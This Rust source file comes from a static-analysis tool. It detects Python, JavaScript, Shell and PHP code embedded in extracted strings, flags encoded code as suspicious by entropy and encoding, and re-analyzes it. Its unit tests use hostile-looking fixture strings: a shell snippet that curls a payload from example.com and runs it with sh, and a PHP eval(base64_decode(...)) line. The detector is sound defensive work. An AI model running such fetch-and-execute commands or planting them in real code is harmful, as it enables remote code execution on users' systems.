//! Embedded Code Detector
//!
//! Analyzes strings extracted by stng to detect and analyze embedded code (both plain and encoded).
//! Detects Python, JavaScript, Shell, and PHP code in strings and re-analyzes them with full
//! AST parsing and capability detection.

use crate::analyzers::{unified::UnifiedSourceAnalyzer, FileType};
use crate::capabilities::CapabilityMapper;
use crate::types::binary::StringInfo;
use crate::types::file_analysis::{encode_decoded_path, FileAnalysis};
use crate::types::Evidence;
use crate::types::{Criticality, Finding};
use anyhow::{Context, Result};
use std::path::Path;
use std::sync::Arc;

/// Maximum nesting depth for decoded strings (prevent infinite recursion)
const MAX_DECODE_DEPTH: usize = 3;

/// Maximum size for individual decoded string (10MB)
const MAX_DECODED_SIZE: usize = 10 * 1024 * 1024;

/// Maximum total decoded bytes per file (50MB)
const MAX_TOTAL_DECODED: usize = 50 * 1024 * 1024;

/// Minimum size for plain strings to analyze (reduce false positives)
const MIN_PLAIN_SIZE: usize = 50;

/// Minimum size for encoded strings to analyze (can be smaller)
const MIN_ENCODED_SIZE: usize = 20;

/// Maximum number of strings to analyze per file
const MAX_STRINGS_TO_ANALYZE: usize = 100;

/// Maximum entropy for code (compressed data has entropy > 7.5)
const MAX_CODE_ENTROPY: f64 = 7.5;

/// Detect if a string contains code worth analyzing
///
/// Uses stng's classification to identify Python, JavaScript, Shell, or PHP code.
/// For strings extracted by stng, classification is already done (no regex needed).
/// For strings from tree-sitter AST, we classify using stng::classify_string().
/// Returns Some(FileType) if code is detected, None otherwise.
#[must_use]
pub fn detect_language(string_info: &StringInfo, is_encoded: bool) -> Option<FileType> {
    let value = &string_info.value;

    // Size checks
    let min_size = if is_encoded {
        MIN_ENCODED_SIZE
    } else {
        MIN_PLAIN_SIZE
    };

    if value.len() < min_size || value.len() > MAX_DECODED_SIZE {
        return None;
    }

    // Check entropy (skip compressed/encrypted data)
    if calculate_entropy(value.as_bytes()) > MAX_CODE_ENTROPY {
        return None;
    }

    // Use stng's classification (either from extraction or by calling classify_string)
    use crate::types::binary::StringType;

    let kind = &string_info.string_type;

    // Check if already classified as code by stng
    match kind {
        StringType::PythonCode => return Some(FileType::Python),
        StringType::JavaScriptCode => return Some(FileType::JavaScript),
        StringType::PhpCode => return Some(FileType::Php),
        StringType::ShellCmd => return Some(FileType::Shell),
        // If not classified as code, classify it now
        _ => {
            // Classify using stng (tree-sitter strings come through here)
            let classified_kind = stng::classify_string(value);
            match classified_kind {
                StringType::PythonCode => return Some(FileType::Python),
                StringType::JavaScriptCode => return Some(FileType::JavaScript),
                StringType::PhpCode => return Some(FileType::Php),
                StringType::ShellCmd => return Some(FileType::Shell),
                _ => {}
            }
        }
    }

    None
}

/// Calculate Shannon entropy of data
fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }

    let mut counts = [0u32; 256];
    for &byte in data {
        counts[byte as usize] += 1;
    }

    let len = data.len() as f64;
    let mut entropy = 0.0;

    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }

    entropy
}

/// Convert FileType to language name string
fn lang_name(file_type: &FileType) -> &'static str {
    match file_type {
        FileType::Python => "python",
        FileType::JavaScript => "javascript",
        FileType::Shell => "shell",
        FileType::Php => "php",
        _ => "unknown",
    }
}

/// Generate automatic language detection trait (auto-generated, no YAML needed like metadata/sign)
fn generate_language_trait(
    detected_lang: &FileType,
    encoding_chain: &[String],
    offset: u64,
) -> Finding {
    let (trait_id, criticality) = if encoding_chain.is_empty() {
        // Plain embedded code - notable
        (
            format!("metadata/lang/embedded::{}", lang_name(detected_lang)),
            Criticality::Notable,
        )
    } else {
        // Encoded code - suspicious (obfuscation attempt)
        let encoding = &encoding_chain[0];
        (
            format!(
                "metadata/lang/encoded/{}::{}",
                encoding,
                lang_name(detected_lang)
            ),
            Criticality::Suspicious,
        )
    };

    let description = format!(
        "{} code {} in string",
        lang_name(detected_lang),
        if encoding_chain.is_empty() {
            "embedded"
        } else {
            "encoded"
        }
    );

    Finding {
        id: trait_id,
        kind: crate::types::FindingKind::Capability,
        desc: description,
        conf: 1.0,
        crit: criticality,
        mbc: None,
        attack: None,
        trait_refs: vec![],
        evidence: vec![Evidence {
            method: "embedded-code-detection".to_string(),
            source: "string-analysis".to_string(),
            value: format!(
                "Detected {} at offset {:#x}",
                lang_name(detected_lang),
                offset
            ),
            location: Some(format!("{:#x}", offset)),
        }],
        source_file: None,
    }
}

/// Result of analyzing an embedded string
#[derive(Debug)]
pub enum EmbeddedAnalysisResult {
    /// Encoded code - becomes a separate layer (FileAnalysis)
    EncodedLayer(Box<FileAnalysis>),
    /// Plain embedded code - findings added to parent
    PlainEmbedded(Vec<Finding>),
}

/// Analyze a string detected as code
pub fn analyze_embedded_string(
    parent_path: &str,
    string_info: &StringInfo,
    _string_index: usize,
    capability_mapper: &Arc<CapabilityMapper>,
    current_depth: usize,
) -> Result<EmbeddedAnalysisResult> {
    // Check depth limit
    if current_depth >= MAX_DECODE_DEPTH {
        anyhow::bail!("Maximum decode depth {} exceeded", MAX_DECODE_DEPTH);
    }

    // Detect language (uses stng classification, no regex needed)
    let t_detect = std::time::Instant::now();
    let is_encoded = !string_info.encoding_chain.is_empty();
    let file_type =
        detect_language(string_info, is_encoded).context("No language detected in string")?;
    let detect_time = t_detect.elapsed();

    let offset = string_info.offset.unwrap_or(0);

    // Create virtual path
    let virtual_path = if is_encoded {
        encode_decoded_path(parent_path, &string_info.encoding_chain, offset as usize)
    } else {
        format!("{}##plain@{:#x}", parent_path, offset)
    };

    // Create analyzer for detected language
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&file_type)
        .context("Failed to create analyzer for language")?
        .with_capability_mapper_arc(capability_mapper.clone());

    // Analyze in-memory
    let t_analyze = std::time::Instant::now();
    let mut report = analyzer
        .analyze_source(Path::new(&virtual_path), &string_info.value)
        .context("Failed to analyze embedded code")?;
    let analyze_time = t_analyze.elapsed();

    if analyze_time.as_millis() > 100 {
        tracing::debug!(
            "embedded_code_detector: Slow analysis - detect: {:?}, analyze: {:?}, lang: {:?}, size: {}",
            detect_time,
            analyze_time,
            file_type,
            string_info.value.len()
        );
    }

    // Generate language detection trait (auto-generated, no YAML needed)
    let lang_trait = generate_language_trait(&file_type, &string_info.encoding_chain, offset);

    if is_encoded {
        // Encoded code - create a separate layer
        report.findings.push(lang_trait);

        let mut file_entry = report.to_file_analysis(0, true);
        file_entry.path = virtual_path.clone();
        file_entry.depth = (current_depth + 1) as u32;
        file_entry.encoding = Some(string_info.encoding_chain.clone());

        // Prefix evidence locations
        for finding in &mut file_entry.findings {
            for evidence in &mut finding.evidence {
                evidence.location = Some(format!(
                    "decoded:{}:{}",
                    virtual_path,
                    evidence.location.as_deref().unwrap_or("unknown")
                ));
            }
        }

        file_entry.compute_summary();
        Ok(EmbeddedAnalysisResult::EncodedLayer(Box::new(file_entry)))
    } else {
        // Plain embedded code - return findings for parent
        let mut findings = report.findings;
        findings.push(lang_trait);

        // Prefix evidence locations to indicate they came from embedded code
        for finding in &mut findings {
            for evidence in &mut finding.evidence {
                evidence.location = Some(format!(
                    "embedded@{:#x}:{}",
                    offset,
                    evidence.location.as_deref().unwrap_or("unknown")
                ));
            }
        }

        Ok(EmbeddedAnalysisResult::PlainEmbedded(findings))
    }
}

/// Process all strings from a file, analyzing detected code
/// Returns (encoded_layers, plain_findings):
/// - encoded_layers: FileAnalysis entries for encoded code (true layers)
/// - plain_findings: Findings for plain embedded code (added to parent)
pub(crate) fn process_all_strings(
    parent_path: &str,
    strings: &[StringInfo],
    capability_mapper: &Arc<CapabilityMapper>,
    current_depth: usize,
) -> (Vec<FileAnalysis>, Vec<Finding>) {
    let mut encoded_layers = Vec::new();
    let mut plain_findings = Vec::new();
    let mut total_analyzed = 0;
    let mut total_bytes = 0;
    let mut detection_attempts = 0;
    let mut detected_count = 0;

    let t_start = std::time::Instant::now();
    let total_string_bytes: usize = strings.iter().map(|s| s.value.len()).sum();
    let max_string_len = strings.iter().map(|s| s.value.len()).max().unwrap_or(0);
    tracing::debug!(
        "embedded_code_detector: Processing {} strings (total {} bytes, max {} bytes)",
        strings.len(),
        total_string_bytes,
        max_string_len
    );

    for (idx, string_info) in strings.iter().enumerate() {
        // Check limits
        if total_analyzed >= MAX_STRINGS_TO_ANALYZE {
            tracing::debug!(
                "embedded_code_detector: Hit MAX_STRINGS_TO_ANALYZE limit ({} analyzed)",
                total_analyzed
            );
            break;
        }

        if total_bytes >= MAX_TOTAL_DECODED {
            tracing::debug!(
                "embedded_code_detector: Hit MAX_TOTAL_DECODED limit ({} bytes)",
                total_bytes
            );
            break;
        }

        // Skip strings that are too large for code detection (likely obfuscated/packed data)
        // Real code fragments shouldn't be > 1MB
        const MAX_STRING_SIZE_FOR_DETECTION: usize = 1024 * 1024; // 1MB
        if string_info.value.len() > MAX_STRING_SIZE_FOR_DETECTION {
            continue;
        }

        detection_attempts += 1;

        // Try to analyze this string
        match analyze_embedded_string(
            parent_path,
            string_info,
            idx,
            capability_mapper,
            current_depth,
        ) {
            Ok(EmbeddedAnalysisResult::EncodedLayer(file_analysis)) => {
                detected_count += 1;
                total_bytes += string_info.value.len();
                total_analyzed += 1;
                encoded_layers.push(*file_analysis);
            }
            Ok(EmbeddedAnalysisResult::PlainEmbedded(findings)) => {
                detected_count += 1;
                total_bytes += string_info.value.len();
                total_analyzed += 1;
                plain_findings.extend(findings);
            }
            Err(_) => {
                // Not code or analysis failed - skip silently
                continue;
            }
        }
    }

    tracing::info!(
        "embedded_code_detector: Processed {} strings in {:?}, detected {} as code, analyzed {}",
        detection_attempts,
        t_start.elapsed(),
        detected_count,
        total_analyzed
    );

    (encoded_layers, plain_findings)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_string_info(value: &str) -> StringInfo {
        StringInfo {
            value: value.to_string(),
            offset: Some(0),
            string_type: crate::types::binary::StringType::Const,
            encoding: "utf-8".to_string(),
            section: None,
            encoding_chain: Vec::new(),
            fragments: None,
        }
    }

    #[test]
    fn test_detect_python() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code = "import os\nimport sys\ndef main():\n    os.system('ls -la')\n    sys.exit(0)";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::Python));
    }

    #[test]
    fn test_detect_javascript() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code =
            "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::JavaScript));
    }

    #[test]
    fn test_detect_shell() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code =
            "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::Shell));
    }

    #[test]
    fn test_detect_php() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code = "<?php eval(base64_decode('test')); echo 'malware'; ?>";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::Php));
    }

    #[test]
    fn test_reject_plain_text() {
        let text = "This is just some regular text without code.";
        let info = make_string_info(text);
        assert_eq!(detect_language(&info, false), None);
    }

    #[test]
    fn test_reject_too_small() {
        let code = "import os"; // Less than MIN_PLAIN_SIZE
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), None);
    }

    #[test]
    fn test_encoded_lower_threshold() {
        let code = "import os\ndef main():\n    pass"; // Only 1 match
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, true), Some(FileType::Python));
    }

    #[test]
    fn test_entropy_calculation() {
        let data = b"aaaaaaaaaa";
        let entropy = calculate_entropy(data);
        assert!(entropy < 1.0); // Low entropy

        // Use more varied data for higher entropy test
        let varied = b"abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
        let entropy = calculate_entropy(varied);
        assert!(entropy > 3.0); // Higher entropy (many unique bytes)
    }
}
